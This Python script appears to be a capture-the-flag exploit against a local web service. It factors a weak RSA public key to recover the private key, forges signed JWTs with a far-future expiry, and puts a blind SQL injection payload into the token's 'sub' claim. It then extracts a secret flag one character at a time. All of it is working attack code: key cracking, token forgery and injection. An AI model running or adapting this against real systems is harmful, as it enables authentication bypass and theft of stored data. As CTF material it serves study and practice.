#!/usr/bin/env python

import sys
import requests
import string
from jose import jwt
from Crypto.Util.number import isPrime, inverse
from Crypto.PublicKey import RSA
from math import isqrt
from tqdm import tqdm
import random


# p * (a * p + b) = N
# a * p**2 + p * b - N = 0
# D = b**2 + 4 * a * N = t**2
# p_1 = (-b + t) // 2a
def crack_RSA(pubkey: str, diff: int):
    rsa = RSA.import_key(pubkey)
    N, e = rsa.n, rsa.e
    a, b, t = None, None, None
    for i in tqdm(range(2**diff + 1, 2**(diff + 1), 2)):
        if isPrime(i):
            c = 4 * i * N
            t = isqrt(c) + 1
            b_pow_2 = pow(t, 2) - c
            if isqrt(b_pow_2) ** 2 == b_pow_2:
                a, b = i, isqrt(b_pow_2)
                break
    print(a, b, t)
    p = (-b + t) // (2 * a)
    assert N % p == 0
    q = N // p
    d = inverse(e, (p-1)*(q-1))
    return N, e, d, p, q


def gen(length: int):
    return "".join(random.choices(string.ascii_letters + string.digits,
                                  k=length))


def register(url):
    data = {
        "username": gen(10),
        "password": gen(10)
    }
    res = requests.post(f"{url}/api/register", json=data)
    print(res.status_code, res.json())
    if res.status_code == 200:
        return data["username"], data["password"], res.json()["id"]


def get_profile(url: str, sub: str):
    malicious_payload = {
            "id": id,
            "sub": sub,
            "exp": 9999999999,
        }
    token = jwt.encode(
        malicious_payload,
        secret_key,
        algorithm="RS256",
    )
    headers = {"Authorization": f"Bearer {token}"}

    res = requests.get(f"{url}/api/profile/", headers=headers, verify=False).json()
    return res


diff = 22
pubkey = open("id_rsa.pub", "r").read().strip()
N, e, d, p, q = crack_RSA(pubkey, diff)
rsa_construct = RSA.construct((N, e, d, p, q))
secret_key = rsa_construct.export_key(pkcs=8)
alphabet = string.ascii_letters + "_{}"

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = 8222
URL = f"http://{HOST}:{PORT}"

username, password, id = register(URL)
print(username, password, id)
flag = ""
position = 1

while True:
    for letter in alphabet:
        sub = f"{username}' AND '{letter}'=(SELECT SUBSTRING(flag, {position}, 1) from secret LIMIT 1) -- q"
        res = get_profile(URL, sub)
        if res.get("detail") is not None:
            continue
        else:
            print(f"letter found {letter}")
            flag += letter
            position += 1
            if letter == "}":
                break
    else:
        continue
    break

print(f"[+] flag is: {flag}")